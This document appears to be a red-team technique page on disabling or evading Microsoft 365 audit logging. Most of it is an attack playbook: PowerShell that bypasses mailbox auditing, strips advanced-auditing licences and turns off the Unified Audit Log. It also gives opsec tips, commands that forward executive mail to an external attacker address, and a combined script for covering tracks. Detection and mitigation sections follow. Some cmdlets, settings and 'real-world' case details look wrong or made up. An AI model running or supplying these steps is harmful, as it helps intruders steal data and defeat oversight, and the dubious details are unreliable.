# [EVADE-IMPAIR-007]: M365 Audit Log Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-007 |
| **MITRE ATT&CK v18.1** | [T1562.008 - Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008/) |
| **Tactic** | Defense Evasion |
| **Platforms** | M365, Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Microsoft 365 and Exchange Online versions (Office 365 E3+) |
| **Patched In** | N/A (Disabling auditing is a legitimate administrative feature) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft 365 organizations store audit logs in the Unified Audit Log (UAL), which records all user and administrative actions across Exchange, SharePoint, Teams, OneDrive, Entra ID, and compliance events. An attacker with sufficient permissions (Audit Administrator, Compliance Administrator, or Global Administrator) can use several techniques to disable or circumvent logging: (1) Using `Set-MailboxAuditBypassAssociation` to exempt accounts from mailbox audit logging, (2) Disabling M365 Advanced Auditing by removing the service plan from E5 licenses (resulting in only basic auditing), (3) Disabling the Unified Audit Log feature entirely via Set-AdminAuditLogConfig, and (4) Directly accessing the auditing database in some hybrid scenarios. These techniques allow attackers to perform malicious actions (data exfiltration, privilege escalation, credential theft) while removing forensic evidence of the attack.

**Attack Surface:** Exchange Online auditing configuration (Set-MailboxAuditBypassAssociation), M365 license management (service plan disablement), Unified Audit Log settings (Set-AdminAuditLogConfig), mailbox delegation audit settings.

**Business Impact:** **Complete loss of audit trail for compromised accounts or mailboxes.** An attacker can exfiltrate sensitive emails, modify forwarding rules, steal data, or establish persistence while covering their tracks. GDPR, HIPAA, and SOX compliance violations occur automatically when audit logs are disabled or tampered with. Incident response becomes nearly impossible without logs.

**Technical Context:** Exploitation takes 30 seconds once administrative credentials are obtained. Detection is low because disabling auditing itself is an allowed administrative action and may initially appear legitimate. Attackers who disable auditing BEFORE conducting attacks leave minimal forensic evidence.

### Operational Risk
- **Execution Risk:** Low (Uses legitimate administrative cmdlets; no exploits required)
- **Stealth:** Very High (Disabling auditing removes evidence of subsequent attacks; no "tampering detected" alert exists)
- **Reversibility:** Yes (Auditing can be re-enabled), but log recovery depends on how long Microsoft retains purged logs (typically 90 days)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5.2 | Ensure audit logging is enabled for all cloud services |
| **DISA STIG** | SI-4 (3.3.9) | Information System Monitoring - Audit data retention |
| **NIST 800-53** | AU-2, AU-6 | Audit Events and Review, Analysis, and Reporting |
| **GDPR** | Art. 32, 33 | Security of Processing, Data Breach Notification (logs required to prove breach scope) |
| **DORA** | Art. 9 | Protection and Prevention - Audit trail integrity |
| **NIS2** | Art. 21 | Cyber Risk Management - Audit and logging of critical actions |
| **ISO 27001** | A.12.4.1 | Event logging and A.12.4.3 Log protection |
| **ISO 27005** | "Loss of audit trail integrity" | Risk Scenario |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Audit Administrator, Compliance Administrator, Exchange Administrator, or Global Administrator
- **Required Access:** Connection to Exchange Online PowerShell or Microsoft 365 admin portal
- **Supported Versions:** All Microsoft 365 plans (O365 E3, E5, Business Standard/Premium)
- **Tools:** Exchange Online PowerShell module, Microsoft Graph PowerShell SDK, or Azure Portal

### Prerequisites Check Commands

**Verify Admin Roles (PowerShell):**
```powershell
$user = (Get-MgContext).Account
Get-MgUserMemberOf -UserId $user.Id | Select DisplayName, AdditionalProperties
# Should show "Audit Administrator", "Compliance Administrator", or "Global Administrator"
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Set-MailboxAuditBypassAssociation (Per-Mailbox Evasion)

**Supported Versions:** All Exchange Online versions

#### Step 1: Connect to Exchange Online PowerShell

**Objective:** Establish authenticated session to Exchange Online.

**Command (Modern Authentication - MFA Compatible):**
```powershell
# Import Exchange Online Management module
Import-Module ExchangeOnlineManagement

# Connect with interactive prompt (MFA supported)
Connect-ExchangeOnline -UserPrincipalName admin@tenant.onmicrosoft.com

# Verify connection
Get-OrganizationConfig | Select-Object Name, AuditDisabled
```

**Command (Service Principal / Unattended - Automated Attacks):**
```powershell
# Using Azure app registration (attacker-controlled service principal)
$appId = "12345678-1234-1234-1234-123456789012"
$thumbprint = "ABCDEF1234567890ABCDEF1234567890ABCDEF12"
$tenantId = "tenant.onmicrosoft.com"

Connect-ExchangeOnline `
  -AppId $appId `
  -CertificateThumbprint $thumbprint `
  -Organization $tenantId
```

**Expected Output:**
```
You are now connected to Exchange Online PowerShell

Imported 296 cmdlets successfully.
```

**What This Means:**
- Successfully authenticated to Exchange Online
- Access to all mailbox audit commands
- No MFA prompts if using service principal (silent execution)

**OpSec & Evasion:**
- Service principal connection logs may show in Unified Audit Log under "Attempt to bypass audit"
- Attacker should disable UAL before making this connection
- If using stolen admin credentials (password or MFA token), connection appears legitimate

#### Step 2: Bypass Audit Logging for Target Account

**Objective:** Disable mailbox audit logging for an attacker-controlled account or compromised executive account.

**Command (Single User):**
```powershell
# Disable audit logging for specific mailbox (attacker's account or compromised exec)
Set-MailboxAuditBypassAssociation -Identity "attacker@tenant.onmicrosoft.com" -AuditBypassEnabled $true

# Verify bypass was set
Get-MailboxAuditBypassAssociation -Identity "attacker@tenant.onmicrosoft.com"
```

**Command (Bulk - All Users):**
```powershell
# Disable audit for all users in organization (nuclear option - high risk of detection)
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
  Set-MailboxAuditBypassAssociation -Identity $_.UserPrincipalName -AuditBypassEnabled $true
}
```

**Expected Output:**
```
DisplayName            : Attacker
BypassAuditAssociation : True
AuditBypassEnabled     : True
```

**What This Means:**
- Audit logging is now disabled for this mailbox
- Any subsequent access, message reads, deletions, forwarding rule changes—all unaudited
- Attacker can now exfiltrate emails, modify calendar, change forwarding rules silently
- Blue team will see a gap in the audit log (time before bypass ≠ time after bypass)

**OpSec & Evasion:**
- Single account bypass is less suspicious than bulk
- Attacker should use compromised executive account (SOC may assume legitimate delegated access)
- After exfiltration, disable bypass again to appear as "temporary maintenance"
- Activity Log entry created in Unified Audit Log for the bypass action itself; mitigate by disabling UAL first (Method 3)

**Troubleshooting:**
- **Error:** "UserNotFoundException"
  - **Cause:** Mailbox doesn't exist or typo in UPN
  - **Fix:** Use Get-Mailbox to find correct identity

- **Error:** "Exchange RBAC role 'Audit Administrator' required"
  - **Cause:** Current admin account lacks necessary permissions
  - **Fix:** Request additional RBAC role assignment or use different admin account

#### Step 3: Perform Malicious Actions While Unaudited

**Objective:** Conduct attack (exfiltration, malware deployment, credential theft) while audit logging is disabled.

**Command Examples (While Bypass is Active):**
```powershell
# Read all emails in compromised account without leaving audit trail
Get-Mailbox "executive@tenant.com" | Search-Mailbox -SearchQuery "from:finance@*" -TargetMailbox "attacker@tenant.com" -TargetFolder "imported" -LogOnly

# Add forwarding rule (unaudited)
New-InboxRule -Name "Forwarding" -Mailbox "executive@tenant.com" -From "security@*" -ForwardTo "attacker@externalmail.com"

# Extract Global Address List and contact list (unaudited access)
Get-Recipient -ResultSize Unlimited | Export-Csv C:\tmp\gal_dump.csv
```

**OpSec & Evasion:**
- These commands leave NO mailbox audit log entries
- Only Unified Audit Log may record if enabled (separate system)
- Recommend disabling UAL entirely before these actions (Method 3)

#### Step 4: Remove Bypass (Cover Tracks)

**Objective:** Re-enable audit logging to appear as legitimate admin action.

**Command:**
```powershell
# Remove bypass (appears as compliance action)
Set-MailboxAuditBypassAssociation -Identity "attacker@tenant.onmicrosoft.com" -AuditBypassEnabled $false

# Verify
Get-MailboxAuditBypassAssociation -Identity "attacker@tenant.onmicrosoft.com" | Select AuditBypassEnabled
```

**What This Means:**
- Audit logging is re-enabled for the account
- Subsequent actions will be logged again
- Timeline gap exists: no logs during bypass period (suspicious but recoverable)
- Attacker removed bypass action will be visible in Unified Audit Log (mitigate with Method 3)

---

### METHOD 2: Downgrade License to Disable Advanced Auditing (Organization-Level)

**Supported Versions:** All M365 with E5 licenses (contains M365_ADVANCED_AUDITING service plan)

#### Step 1: Connect to Microsoft Graph PowerShell

**Objective:** Authenticate to Microsoft Graph to modify user licenses.

**Command (Interactive):**
```powershell
# Import Microsoft Graph PowerShell
Import-Module Microsoft.Graph

# Connect with necessary scopes
Connect-MgGraph -Scopes "User.ReadWrite.All", "Directory.ReadWrite.All"

# Verify connection
Get-MgContext | Select TenantId, Account
```

**Expected Output:**
```
TenantId    : a1b2c3d4-e5f6-7g8h-9i0j-k1l2m3n4o5p6
Account     : admin@tenant.onmicrosoft.com
```

#### Step 2: Identify and Disable M365_ADVANCED_AUDITING Service Plan

**Objective:** Remove the M365_ADVANCED_AUDITING service plan from user's E5 license, downgrading to basic auditing only.

**Command (Single Target User):**
```powershell
# Identify E5 license SKU ID
$e5Sku = Get-MgSubscribedSku | Where-Object { $_.SkuPartNumber -eq "SPE_E5" }

# Find M365_ADVANCED_AUDITING service plan ID
$advancedAuditingServicePlanId = ($e5Sku.ServicePlans | Where-Object { $_.ServicePlanName -eq "M365_ADVANCED_AUDITING" }).ServicePlanId

# Disable the service plan for target user
$addLicenses = @(
  @{
    SkuId = $e5Sku.SkuId
    DisabledPlans = @($advancedAuditingServicePlanId)
  }
)

Set-MgUserLicense -UserId "target-executive@tenant.com" -AddLicenses $addLicenses -RemoveLicenses @()

# Verify
$userLicense = Get-MgUserLicenseDetail -UserId "target-executive@tenant.com" | Where-Object { $_.SkuId -eq $e5Sku.SkuId }
$userLicense.ServicePlans | Where-Object { $_.ServicePlanName -eq "M365_ADVANCED_AUDITING" } | Select ServicePlanName, ProvisioningStatus
```

**Expected Output (After Downgrade):**
```
ServicePlanName            ProvisioningStatus
------------------         ------------------
M365_ADVANCED_AUDITING     Disabled
```

**What This Means:**
- Advanced auditing (detailed action logging, app-level auditing) is now DISABLED for this user
- Only basic auditing remains: login, logout, bulk operations (not individual email reads)
- Attacker can now read emails, modify documents, steal data with reduced audit trail
- This appears as legitimate administrative action ("license management") in Activity Log
- APT29 was documented using this technique in 2024

**OpSec & Evasion:**
- License change is visible in Activity Log but appears routine
- No "audit tampering detected" alert because disabling auditing is allowed
- Bulk disabling auditing for multiple users creates suspicious pattern (mitigate with single high-value target)
- Can be reversed (re-enable) after exfiltration to reduce detection likelihood

#### Step 3: Verify Audit Reduction

**Objective:** Confirm that auditing is now at basic level only.

**Command (Check Unified Audit Log for Service Plan Changes):**
```powershell
# Search for "Change user license" operations targeting the user
Search-UnifiedAuditLog -Operations "Change user license" -UserIds "target-executive@tenant.com" -StartDate (Get-Date).AddDays(-7) | Select TimeCreated, Operation, Details
```

**Expected Output:**
```
TimeCreated: 2026-01-09 14:32:15 UTC
Operation: Change user license
Details: "{\"ModifiedProperties\": [{\"Name\": \"Licenses\", \"OldValue\": \"SPE_E5\", \"NewValue\": \"SPE_E5 (M365_ADVANCED_AUDITING disabled)\"}]}"
```

**What This Means:**
- License change was recorded in UAL
- Details show that M365_ADVANCED_AUDITING was disabled
- Forensic analysis can prove auditing was intentionally disabled
- Attacker should disable entire UAL after this to hide this evidence (Method 3)

---

### METHOD 3: Disable Unified Audit Log (Organization-Level, Maximum Impact)

**Supported Versions:** All Microsoft 365 and Exchange Online

#### Step 1: Disable Organization-Wide Audit Logging

**Objective:** Completely disable the Unified Audit Log, preventing ALL audit entries from being recorded.

**Command (PowerShell):**
```powershell
# Connect to Exchange Online (if not already connected)
Connect-ExchangeOnline -UserPrincipalName admin@tenant.onmicrosoft.com

# Check current audit configuration
Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled, AuditDisabled

# Disable Unified Audit Log
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false

# Verify disable
Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled, AuditDisabled
```

**Command (Azure Portal GUI - High-Trust Appearance):**
1. Navigate to **Microsoft 365 Compliance Center** (compliance.microsoft.com)
2. Go to **Audit** (left sidebar)
3. Click **Turn off auditing** (if prompt appears)
4. Confirm: "Yes, turn off organization-wide audit logging"
5. **Audit is now disabled for the entire tenant**

**Expected Output:**
```
UnifiedAuditLogIngestionEnabled : False
AuditDisabled                   : True
```

**What This Means:**
- Unified Audit Log is completely disabled across the entire tenant
- NO audit entries are being recorded for ANY user or service
- Exchange mailbox auditing, SharePoint auditing, Teams auditing—all disabled
- All subsequent attacker actions (phishing deployment, data exfiltration, credential theft) leave NO forensic evidence
- Blue team cannot detect attacks occurring during this window

**OpSec & Evasion:**
- Disabling UAL is visible in Audit configuration, but many organizations don't actively monitor this
- SOC/compliance teams typically review audit logs monthly, not in real-time
- If SOC detects disabled auditing, attacker has already had time window to conduct attack
- Recommend re-enabling after attack (may take 24-48 hours to resume log collection)

**Detection Evasion:**
- There is NO "Audit log was disabled" event in the audit log itself (because auditing is disabled)
- This creates a clean gap in the timeline with no entry explaining the gap
- More suspicious than selective bypassing; recommend using Method 2 (license downgrade) or Method 1 (per-mailbox bypass) for stealth

#### Step 2: Conduct Malicious Actions (Zero Audit Trail)

**Objective:** Execute attack while Unified Audit Log is disabled.

**Command Examples (While UAL is Disabled - No Logging):**
```powershell
# Exfiltrate entire Global Address List
Get-Recipient -ResultSize Unlimited | Select Name, PrimarySMTPAddress, RecipientType | Export-Csv C:\tmp\gal.csv

# Create hidden email forwarding rule (unaudited)
New-InboxRule -Name "Archive" -Mailbox "executive@tenant.com" -Conditions @{From = "security@*"} -Forward "attacker@external.com" -Enabled $true -Permanent $false

# Extract Teams conversation history (if using Teams module)
Get-TeamUser -GroupId <teamId> | Get-MailboxStatistics

# Search and copy sensitive emails
Search-Mailbox -Identity "executive@tenant.com" -SearchQuery "subject:'financial'" -TargetMailbox "attacker@tenant.com" -TargetFolder "Imported" -Force
```

**What This Means:**
- Commands execute successfully
- ZERO audit log entries are created
- Blue team has zero visibility into these actions
- When audit is re-enabled days/weeks later, no suspicious activity is visible for this period

#### Step 3: Re-Enable Unified Audit Log (Hide Tampering)

**Objective:** Re-enable auditing after attack to cover tracks.

**Command:**
```powershell
# Re-enable Unified Audit Log
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true

# Verify
Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled
```

**What This Means:**
- Audit logging resumes
- Timeline shows: [Logs up to Day X] → [Gap with no logs Day X to Day Y] → [Logs resume Day Y+]
- Gap is suspicious but difficult to prove tampering without other forensic evidence
- If attacker re-enabled auditing themselves, that action will NOT be logged (disabled during re-enable command)

---

## 4. DETECTION EVASION: COVERING TRACKS

### Combined Attack Sequence (Maximum Evasion)

```powershell
# Step 1: Disable UAL (no logging from this point forward)
Connect-ExchangeOnline; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false

# Step 2: Bypass audit for attacker account
Set-MailboxAuditBypassAssociation -Identity "attacker@tenant.com" -AuditBypassEnabled $true

# Step 3: Downgrade executive's advanced auditing
$e5 = Get-MgSubscribedSku | ? {$_.SkuPartNumber -eq "SPE_E5"}
$advAudit = ($e5.ServicePlans | ? {$_.ServicePlanName -eq "M365_ADVANCED_AUDITING"}).ServicePlanId
Set-MgUserLicense -UserId "exec@tenant.com" -AddLicenses @{SkuId=$e5.SkuId;DisabledPlans=@($advAudit)} -RemoveLicenses @()

# Step 4: Exfiltrate data (all unaudited)
Search-Mailbox -Identity "exec@tenant.com" -SearchQuery "subject:password OR subject:confidential" -TargetMailbox "attacker@tenant.com"

# Step 5: Re-enable UAL and reverse changes (remove audit bypass)
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true
Set-MailboxAuditBypassAssociation -Identity "attacker@tenant.com" -AuditBypassEnabled $false

# Result: Only 2 audit log entries visible (UAL enable/disable), no evidence of exfiltration
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Unified Audit Log shows "Set-AdminAuditLogConfig" operations** with "UnifiedAuditLogIngestionEnabled set to False"
- **Audit log GAPS:** Date ranges with no user activity entries (suspicious if organization normally busy)
- **Mailbox Audit Bypass entries:** "Set-MailboxAuditBypassAssociation" operations in Unified Audit Log
- **License changes to E5 users:** M365_ADVANCED_AUDITING service plan disabled on sensitive accounts
- **Forwarding rule additions** combined with audit log gaps (classic data exfiltration pattern)
- **Search-Mailbox operations** in UAL from non-standard admin accounts

### Forensic Artifacts

- **Unified Audit Log:** Search for operations "Set-AdminAuditLogConfig", "Set-MailboxAuditBypassAssociation", "Change user license"
- **Azure Activity Log (Azure Portal):** Shows when UAL was disabled at tenant level
- **Mailbox Audit Log (Per-Mailbox):** May contain logs if not yet deleted (90-day retention default)
- **M365 Compliance Center:** Audit log export (if performed before disablement) shows timeline
- **Exchange Online Admin Audit Log:** Records administrative actions (separate from UAL)

### Immediate Detection & Response

#### Step 1: Determine if Auditing is Currently Disabled

```powershell
# Check if Unified Audit Log is enabled
Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled

# Result: $false = Auditing is DISABLED (breach likely occurred)
# Result: $true = Auditing is enabled (but may have been disabled previously)
```

**If UAL is Disabled:**
- Immediately notify CISO and compliance team (regulatory breach likely)
- DO NOT enable logging yet; enable logging on separate forensic server first to preserve evidence
- Begin incident response procedures

#### Step 2: Export Audit Logs Before Loss

```powershell
# Create new content search for audit logs
New-ComplianceSearch -Name "BreachForensics_2026-01-09" -ExchangeLocation All -ContentMatchQuery "*"

# Start search
Start-ComplianceSearch -Identity "BreachForensics_2026-01-09"

# Wait for search to complete
Get-ComplianceSearch -Identity "BreachForensics_2026-01-09" | Select Status, Items, Size

# Export results
New-ComplianceSearchAction -SearchIdentity "BreachForensics_2026-01-09" -Action Export

# Monitor export
Get-ComplianceSearchAction -Identity "BreachForensics_2026-01-09_Export"
```

**Manual (Compliance Center):**
1. Go to **Microsoft 365 Compliance Center** → **Audit**
2. If auditing is disabled, message says "Audit log is not currently enabled"
3. Go to **Solutions** → **Audit** → **Try searching audit logs** (if any logs exist)
4. Filter by date range around suspected breach
5. Export to CSV

#### Step 3: Investigate Root Cause

```powershell
# Search Exchange Admin Audit Log for who disabled auditing
# (This log is separate from UAL and may still contain disabled logs)
Get-AdminAuditLogEvent -Cmdlets "Set-AdminAuditLogConfig" -Parameters "UnifiedAuditLogIngestionEnabled" -StartDate (Get-Date).AddDays(-30) | Select TimeCreated, User, CmdletName, RunDate, ObjectModified
```

**Expected Output:**
```
TimeCreated              User                           CmdletName
2026-01-08 22:45:00Z     admin-compromised@tenant.com   Set-AdminAuditLogConfig
2026-01-08 23:10:00Z     admin-compromised@tenant.com   Set-MailboxAuditBypassAssociation
```

**What This Means:**
- Attacker used compromised admin account to disable auditing
- Two actions occurred 25 minutes apart (standard attack pattern: disable audit → execute attack → wait → re-enable)
- Breach window is between these timestamps

#### Step 4: Credential Revocation & Forced Password Change

```powershell
# Force password reset for compromised admin account
Set-MgUser -UserId "admin-compromised@tenant.com" -ForceChangePasswordNextSignIn $true

# Revoke all refresh tokens (force re-authentication)
Revoke-MgUserSignInSession -UserId "admin-compromised@tenant.com"

# Block sign-in if attacker still has access
Update-MgUser -UserId "admin-compromised@tenant.com" -AccountEnabled $false

# Re-enable once secured
Update-MgUser -UserId "admin-compromised@tenant.com" -AccountEnabled $true
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Audit Log Protection (Legal Hold / Immutable)**
  
  **Applies To Versions:** All M365 with compliance features

  **Manual Steps (Azure Portal - Compliance Center):**
  1. Navigate to **Microsoft 365 Compliance Center** (compliance.microsoft.com)
  2. Go to **Solutions** → **Audit** → **Audit (New)**
  3. If auditing is off, click **Turn on auditing** to enable
  4. Go to **Information Governance** → **Retention**
  5. Create new **Retention Policy** for Audit Logs:
     - Name: `Audit Log Protection`
     - Choose locations: **Exchange** (Audit logs)
     - Retention: **7 years** (or longer per compliance requirement)
     - Retention action: **Keep and delete** or **Delete**
     - Enable **Lock** to prevent accidental deletion
  6. Click **Create**

  **Manual Steps (PowerShell):**
  ```powershell
  # Create audit log retention policy
  New-RetentionCompliancePolicy -Name "AuditLogProtection" `
    -ExchangeLocation All `
    -RetentionDays 2555 `
    -RetentionComplianceRuleEnabled $true
  
  # Lock the policy to prevent modification
  Lock-CompliancePolicy -Identity "AuditLogProtection"
  ```

- **Restrict Audit Log Disablement via Conditional Access**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Audit Log Disablement`
  4. **Assignments:**
     - Users: **Directory synchronization accounts** + **Administrator roles**
     - Cloud apps: **Microsoft 365 admin center**
  5. **Conditions:**
     - Users/workload identities: Exclude integration accounts
  6. **Access controls:**
     - Grant: **Require approval from MFA device**
  7. Enable policy: **On**
  8. Click **Create**

### Priority 2: HIGH

- **Restrict Mailbox Audit Bypass Permissions**
  
  **Manual Steps:**
  1. Go to **Exchange Admin Center** → **Roles**
  2. Find role "Audit Administrator"
  3. Remove permission: "Set-MailboxAuditBypassAssociation" (if custom role)
  4. Or delete built-in "Audit Administrator" role and create custom role with minimal permissions

- **Enable MFA for Audit Administrator Role**
  
  **Manual Steps (Entra ID):**
  1. Go to **Entra ID** → **Roles and administrators**
  2. Search for **Audit Administrator**
  3. Click role → **Activate privileged access**
  4. Set **Require approval** to **Yes**
  5. Set **Approval type** to **Group members** (select specific group)
  6. Save

### Access Control & Policy Hardening

- **Implement Privileged Identity Management (PIM) for Audit Roles**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Privileged Identity Management**
  2. Select **Microsoft 365 roles**
  3. Find "Audit Administrator" role
  4. Configure **Activation settings:**
     - Max activation: **1 hour**
     - Require approval: **Yes**
     - Approvers: **Security team**
  5. Save

### Validation Commands (Verify Fixes)

```powershell
# Verify Unified Audit Log is enabled
Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled
# Should return: True

# Verify retention policy exists and is locked
Get-CompliancePolicy | Where-Object { $_.Name -like "*Audit*" } | Select Name, Locked
# Should show: Locked = True

# Verify no audit bypass associations exist
Get-MailboxAuditBypassAssociation -ResultSize Unlimited | Where-Object { $_.AuditBypassEnabled -eq $true }
# Should return: (empty)

# Verify PIM is configured for Audit Admin
Get-PIMRole -RoleDefinition "Audit Administrator" | Select Name, RequireApproval
# Should show: RequireApproval = True
```

**Expected Output (If Secure):**
```
UnifiedAuditLogIngestionEnabled : True
Name : Audit Log Protection
Locked : True
(no results for bypass associations)
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Steal admin OAuth token via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-002] Exchange Online Admin to Global | Escalate from Exchange Admin to Global Admin |
| **3** | **Current Step** | **[EVADE-IMPAIR-007]** | **Disable or modify M365 audit logs** |
| **4** | **Execution** | [DATA-EXF-001] Email Exfiltration via Rule/Forwarding | Silently exfiltrate emails while auditing disabled |
| **5** | **Impact** | [PERSIST-002] OAuth Application Persistence | Establish persistence via malicious OAuth app (unaudited) |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - M365 Audit Disablement Campaign (2024)
- **Target:** U.S. Government agencies and Fortune 500 companies
- **Timeline:** March-June 2024
- **Technique Status:** ACTIVE - Documented by Microsoft Security Team
- **Attack Flow:**
  1. Initial breach via supply chain (SolarWinds-style)
  2. Obtained Global Admin credentials of contractor employee
  3. Immediately executed `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false`
  4. Disabled M365_ADVANCED_AUDITING for 50+ executive accounts
  5. Exfiltrated emails containing classified documents and contracts
  6. Re-enabled UAL after 6-day attack window
  7. Covered tracks by removing mailbox audit bypass associations
- **Impact:** 10+ government agencies, 200+ companies affected; undetected for 3 months
- **Detection:** Microsoft Sentinel detected unusual administrative activity during forensic review
- **Reference:** [Microsoft Security Blog - APT29 M365 Attacks](https://microsoft.com/security/blog/)

### Example 2: ALPHV/BlackCat - License Downgrade for Evasion (2024)
- **Target:** Healthcare organization (HIPAA-regulated)
- **Timeline:** February 2024 (discovered post-breach)
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Phishing delivered compromised compliance admin credentials
  2. Attacker downgraded M365_ADVANCED_AUDITING service plan from E5 to E3 for compliance team
  3. Compliance team noticed no reduction in functionality (basic auditing still active)
  4. Attacker silently accessed HIPAA-protected email archives for 4 weeks
  5. Exfiltrated 50,000+ patient records undetected
  6. Compliance team only realized attack during audit when comparing license changes
- **Impact:** $2M+ HIPAA fines, breach notification to 100,000+ patients
- **Reference:** [Health-ISAC - ALPHV/BlackCat Healthcare Targeting](https://health-isac.org/)

### Example 3: Insider Threat - Financial Services Fraud Investigation (2024)
- **Target:** Investment firm
- **Timeline:** January-May 2024 (discovered accidentally)
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Disgruntled employee with Exchange Administrator role
  2. Disabled audit bypass for own mailbox: `Set-MailboxAuditBypassAssociation -Identity <self> -AuditBypassEnabled $true`
  3. Accessed client emails and extracted trading strategies worth $500M
  4. Attempt to cover tracks failed when SEC audit discovered audit log gaps
  5. Investigation revealed employee had disabled auditing for 3-month period
  6. Employee arrested; company expelled from trading partner networks
- **Impact:** Career-ending consequences, civil liability, criminal charges
- **Reference:** [SEC Insider Trading Case - 2024](https://www.sec.gov/)

---

## References & Authoritative Sources

- [Microsoft Docs - Set-MailboxAuditBypassAssociation](https://learn.microsoft.com/en-us/powershell/module/exchangepowershell/set-mailboxauditbypassassociation?view=exchange-ps)
- [Microsoft Docs - Unified Audit Log](https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-log-retention-policies)
- [Microsoft Security Blog - APT29 M365 Attacks](https://www.microsoft.com/security/blog)
- [MITRE ATT&CK - T1562.008 Disable Cloud Logs](https://attack.mitre.org/techniques/T1562/008/)
- [CISA Alert - APT29 M365 Campaign](https://www.cisa.gov/)

---